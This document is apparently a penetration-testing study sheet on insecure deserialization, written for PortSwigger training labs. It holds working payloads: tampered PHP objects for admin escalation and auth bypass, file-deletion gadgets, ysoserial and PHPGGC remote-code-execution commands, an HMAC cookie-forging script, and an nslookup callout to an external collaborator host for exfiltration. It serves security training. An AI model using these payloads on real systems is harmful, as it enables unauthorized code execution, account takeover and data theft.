# Insecure Deserialization

## Summary

* [Recon for Insecure Derialization](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

* Additional Notes:  There is a PDF attached in this folder that has a walk-through of the labs.  The document does not need to be downloaded, it can be viewed inline in GitHub.


<br><br>

## Recon

<br><br>

### How to identify insecure deserialization vulnerabilities

* https://portswigger.net/web-security/deserialization/exploiting#how-to-identify-insecure-deserialization

<br>

#### __Java Serialization Format:__

* Serialized Java Objects always begin with the same bytes:

    * Hexa-decimal:  ac ed

    * Base64:  ro0

<br>

#### __PHP Serialization Format:__

* Serialized Objects are usually base-64 encoded.

* Example, consider a User object with the attributes:

    * $user->name = "carlos";

    * $user->isLoggedIn = true;

* When serialized, this object may look something like this:

```php
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

<br><br>

## Tools and Burp Extensions Used:

* Ysoserial  (https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f)

* PHP Generic Gadget Chains (PHPGGC)

* Java Deserialization Scanner - https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae
  

<br><br>

## Cheat Sheet

<br><br>

### __Modifying Serialized Objects – PHP__

* Identify if there is a PHP Object that is being used in any HTTP requests sent to the application.  Decode the Object and check if there are any sensitive fields such as “isAdmin”, “role”, etc.  If there is a sensitive field, modify the Object and re-encode it.

* Example:

```php
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

* Modify the serialized Object, encode it and submit it back in the HTTP request.  Here the "isAdmin" fields was changed to the value of 1, which equals to true:

```php
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;}
```

<br><br>

### __Modifying Serialized Data Types – PHP__

* Taking advantage of PHP-based logic when comparing different date types with the loose comparison operator (==).

* PHP quirks when comparing data of different types:

    * 5 == “5 example”  // true
    * 5 == “example”  // false
    * 0 == “example”  //true
    * 0 == “9example”  // false

* If the application is using the loose comparison operator to validate critical information such as a password, the 3rd option is interesting^.  If the password does not begin with a number, we can supply a 0, and the values will be "equal" to each other.

* Identify if the application is passing any serialized Objects in the HTTP requests.

* If you find a PHP serialized Object like below:

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:”eyhsfxxxxxx”;}
```

* Change the “access_token” value to the integer 0, this can potentially bypass authentication/authorization, if the application is using PHP loose comparison operator (==):

```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

<br><br>

### __Exploit Application Functionality with Serialized Object – PHP__

* An application has a “Delete Account”  functionality and is using a user controllable serialized PHP Object to determine the file that it deletes.

* For Example:  The application uses the “avatar_link” attribute to delete a file from the server’s filesystem.

```php
s:11:"avatar_link";s:19:"/users/wiener/avatar"
```

* This vector can be used to delete other files by changing the value of the attribute and submitting it in the request:

```php
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
```

<br><br>

### __Arbitrary Object Injection – PHP__

* Enumerate the application and identify if there are any leaked source code files that contain sensitive fields/functionality.  We can read source code files sometimes by appending a tilde ( ~ ) character at the end of it's name.  For example, Test.php~ can show the PHP file's source code instead of just executing it.

* The PHP class contains a magic method “\_\_destruct” that will invoke the unlink() method on the lock_file_path attribute.  This deletes the file that is passed to the method.

* Create the following PHP serialized Object to delete a file in the server’s file system:

```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

<br><br>

### __Java Deserialization with Apache Commons – Pre-built Gadget Java__

* Pre-built gadget exploitation.  We can use the “ysoserial” tool to generate a malicious serialized Object containing a remote code execution payload.  __Note:__ that the “ysoserial” tool is dependent on Java version 15 or lower.

* Resource:  https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f  

* Example payloads:

   * java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > test.txt

* This payload can be used to exfiltrate date, for example.  Copy and paste the results into the Cookie of the target application.  Check out more obfuscation examples in the "Command Injection" folder.

   * ./java -jar /root/Tools/ysoserial-all.jar CommonsCollections4 "nslookup `echo 'hello'|base64`.r29q0ep.oastify.com" | base64 -w 0 > ../../test1-1.txt
 

<br><br>

### __Ruby Deserialization with Pre-built Gadget – Ruby__

* Enumerate the application and identify if it is using a serialized Object in any of the HTTP requests.

* For Ruby serialized Objects, we can use a pre-built gadget to generate a malicious Ruby serialized Object and exploit the application:

    * https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

    * https://www.onlinegdb.com/online_ruby_compiler

<br><br>

### __PHP Deserialization with Pre-built Gadget - PHP__

* Enumerate the application and identify if there are any dependencies that the application is using.

* For example, if the application depends on the Symfony framework, we can use a tool to generate a malicious serialized Object.

    * Tool:  PHPGGC

    * Payload:   ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64

* If the serialized Object is being signed using an SHA-1 HMAC hash, identify if the application is disclosing the secret key in any of the configuration files or responses.  The “/cgi-bin/phpinfo.php” file is a good place to search for.

* The following script can be used to then sign the serialized Object using the secret key:

```php
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
?>
```

<br><br>

### __Developing Custom Gadget – Java Deserialization__

* Enumerate the application and identify if there are any leaked Java source code files.  Then analyze the code to see if any of the fields are being passed to a dangerous method/sink.

* Manually create the Java Class and serialized the Object with a malicious payload and inject it to the application.

* Portswigger provides a generic program for serializing Java Objects:  https://github.com/PortSwigger/serialization-examples/tree/master/java/generic

* See the example in the lab/document.

<br><br>

### __Developing Custom Gadget – PHP Deserialization__

* Enumerate the application and identify if there are any leaked PHP source code files.  Then analyze the code to see if any of the fields are being passed to a dangerous method/sink.

* Since PHP uses a String based serialization method, we don’t need to manually create the Class and serialized it.

* We can use an example payload like below:

```php
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

* See the example in the lab/document.

<br><br>

### __Using PHAR deserialization to deploy a custom gadget chain__

* Check out the walk-through in lab/document. - https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain

<br><br>

### __Pending to complete labs that are missing from cheat sheet:__

* All labs in this category are completed and referenced in cheat sheet or attached document.
